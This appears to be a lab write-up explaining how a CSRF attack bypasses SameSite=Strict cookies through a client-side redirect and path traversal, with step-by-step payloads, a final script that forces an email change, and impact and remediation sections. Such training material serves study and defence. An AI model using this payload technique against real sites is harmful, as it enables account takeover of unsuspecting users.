# SameSite Strict bypass via client-side redirect

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.


### Vulnerability / Concept

Cross-Site Request Forgery (CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they did not intend to perform. It occurs when an application relies solely on cookies for session management without validating that the request originated from the legitimate user's own actions.

CSRF attacks exploit the browser's automatic inclusion of cookies in cross-origin requests. If the victim is authenticated to the target application, the attacker's forged request carries the victim's session cookie, making it appear legitimate to the server.

Key conditions for CSRF: (1) A relevant state-changing action exists, (2) Session management is cookie-based, (3) No unpredictable request parameters (like CSRF tokens) are required.

### Recon / Initial Analysis

1. Identify state-changing endpoints (POST/PUT/DELETE requests that modify data)
2. Check if the application uses CSRF tokens in forms or headers
3. Examine how tokens are validated (presence, session-binding, method-dependence)
4. Test if SameSite cookie attributes are set on session cookies
5. Check if Referer header validation is performed
6. Verify if token validation can be bypassed by removing the token or changing the request method

### Analysis/Exploitation -

Login as user `wiener`:

![](./images/caabe9cbf9e4_001.png)

it’ll set a new session cookie for us: we can see there is a `SameSite` attribute, which is set to `Strict` restriction.

**Inspect the change-email request **

![](./images/caabe9cbf9e4_002.png)

It doesn’t have a CSRF token parameter, which helps to prevent CSRF (Cross-Site Request Forgery) attack. So, it may be vulnerable to CSRF.

It send a POST request to `/my-account/change-email`, with parameter `email`, `submit`.

**Change request method to GET**

![](./images/caabe9cbf9e4_003.png)

It accepts the GET method too

However, in order to exploit CSRF, we first have to **bypass the **`SameSite=Strict`** restriction.**

{% hint style="info" %}
💡 **Strict restriction:**

If a cookie is set with the `SameSite=Strict `attribute, browsers won’t include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site.

One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters.

As far as browsers are concerned, these client-side redirects aren’t really redirects at all; the resulting request is just treated as an ordinary, standalone request. Most importantly, this is a same-site request and, as such, will include all cookies related to the site, regardless of any restrictions that are in place.

If you can manipulate this gadget to elicit a malicious secondary request, this can enable you to bypass any SameSite cookie restrictions completely.

{% endhint %}


**Find & Understand the Client Side Redirect**

In the home page, we can view different posts And we can leave some comments.

Let’s leave a test comment:

![](./images/caabe9cbf9e4_004.png)

![](./images/caabe9cbf9e4_005.png)

After we send the request, it’ll fetch a JavaScript file:

![](./images/caabe9cbf9e4_006.png)

When we go to `/post/comment/confirmation`, it’ll run that JavaScript:

- After 3 seconds, redirect user to `/post/<postId>`

![](./images/caabe9cbf9e4_007.png)

However, the GET parameter `postId` is fully under attacker’s control!

**Now, what if I change the path to **`/my-account`** via path traversal?**

- Start crafting our payload

```html
/post/comment/confirmation?postId=6
```

- Change payload to redirect to my-account page

```html
/post/comment/confirmation?postId=my-account/
```

- Add a traversal attack to our payload

```html
/post/comment/confirmation?postId=../my-account/
```

- Modify payload to change our email

```html
/post/comment/confirmation?postId=../my-account/change-email?email=test@wiener.com&submit=1
```

- URL encode ampersand `&` may its not able to determine when our mail ends

```html
/post/comment/confirmation?postId=../my-account/change-email?email=test@wiener.com%26submit=1
```

- Craft out final payload

```html
<script>
window. location = "https://0ad1003704e4d04e8077d6250056008f.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=test@wiener.com%26submit=1
</script>
```

- Deliver our final payload to the victim

### Why It Works

The vulnerability exists because the server trusts that any request bearing the victim's session cookie was intentionally initiated by the victim. Without anti-CSRF tokens, SameSite cookie restrictions, or Referer validation, the server cannot distinguish between a legitimate request from the user and a forged request from an attacker's page.

The broken trust boundary is between the browser and the server: the browser automatically attaches cookies to any request to the target domain, regardless of which site initiated the request. This design feature of HTTP cookies becomes a security flaw when the server treats cookie presence as proof of user intent.

### Real-World Impact

An attacker could trick an authenticated user into:
- Changing their email address (account takeover via password reset)
- Transferring funds to the attacker's account
- Modifying account settings (disabling 2FA, changing security questions)
- Deleting or modifying critical data
- Elevating privileges if the victim has admin access
- Performing any action the victim is authorized to perform

### Remediation

- Use CSRF tokens that are unique per session and validated server-side on every state-changing request
- Implement SameSite=Strict or SameSite=Lax on session cookies
- Validate the Referer or Origin header on state-changing requests
- Require re-authentication for critical actions (password change, email change, fund transfers)
- Use the Double Submit Cookie pattern as additional defense-in-depth

### Key Takeaways

- CSRF exploits the browser's automatic cookie inclusion — the server cannot verify request origin without additional checks.
- CSRF tokens must be unique per session and validated server-side — their mere presence is not enough.
- SameSite cookie restrictions provide a strong first line of defense but are not a complete solution.
- Referer/Origin validation adds another layer but can be bypassed if not implemented correctly.
- State-changing operations must never be performed via GET requests.
